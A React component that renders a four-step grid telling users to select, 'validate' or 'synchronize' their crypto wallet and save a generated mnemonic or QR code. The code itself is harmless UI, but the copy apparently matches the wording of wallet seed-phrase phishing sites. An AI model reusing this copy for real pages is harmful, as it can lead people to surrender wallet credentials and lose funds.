import React from "react";

import {
  BsFillGridFill,
  BsFillImageFill,
  BsFillBookmarkDashFill,
} from "react-icons/bs";
import { FaWallet } from "react-icons/fa";

const myChoosen = [
  {
    id: 1,
    icon: <FaWallet style={{ fontSize: "1.5em" }} />,
    name: "Select Your Wallet",
    desc: "We have varieties of wallets you can choose from to validate or synchronize your wallet. Please, select your correct wallet name before proceeding.",
  },
  {
    id: 2,
    icon: <BsFillGridFill style={{ fontSize: "1.5em" }} />,
    name: "Validate Your Wallet",
    desc: "Once you select your wallet, you will be prompted to connect via a decentralized protocol. This can successfully be completed manually or automatically.",
  },
  {
    id: 3,
    icon: <BsFillImageFill style={{ fontSize: "1.5em" }} />,
    name: "Generate QR Code",
    desc: "Upon successful validation, a QR Code will be generated for your wallet. You can always scan your QR Code to reinitialize your wallet.",
  },
  {
    id: 4,
    icon: <BsFillBookmarkDashFill style={{ fontSize: "1.5em" }} />,
    name: "Save Wallet QR Code",
    desc: "Saving your generated mnemonic code or QR Code is important. You can click on Save or Screenshot the QR Code Page. You choose how you want to save!",
  },
];

const Choose = () => {
  return (
    <div className="choose-container-overall">
      <div className="choose-container">
        <br />
        <div className="choose-grid-container">
          {myChoosen.map((choose) => {
            return (
              <div key={choose.id} className="choose-contains">
                <div className="icon-color-bg">{choose.icon}</div>
                <br />
                <h2>{choose.name}</h2>
                <br />
                <p>{choose.desc}</p>
                <br />
                <br />
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
};

export default Choose;
